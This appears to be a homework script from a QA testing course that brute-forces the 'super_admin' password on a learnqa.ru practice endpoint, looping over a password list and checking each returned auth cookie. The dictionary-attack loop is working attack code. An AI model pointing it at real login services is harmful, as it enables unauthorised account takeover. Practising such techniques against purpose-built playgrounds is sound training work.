import requests
import BigLists

login = "super_admin"

answer_for_bad_pass = "You are NOT authorized"
answer_for_good_pass = "You are authorized"

print("Please wait the program is running")
for i in BigLists.listOfPass:
    response_with_pass = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework",
                                       data={"login" : "super_admin", "password" : i})
    my_cookie = response_with_pass.cookies.get("auth_cookie")
    cookies = {"auth_cookie": my_cookie}
    response_with_cookie = requests.get("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response_with_cookie.text == answer_for_good_pass:
        print(
            "Your authorization status -", response_with_cookie.text,
            "\nYour password -", i,
            "\nHave a nice day"
        )


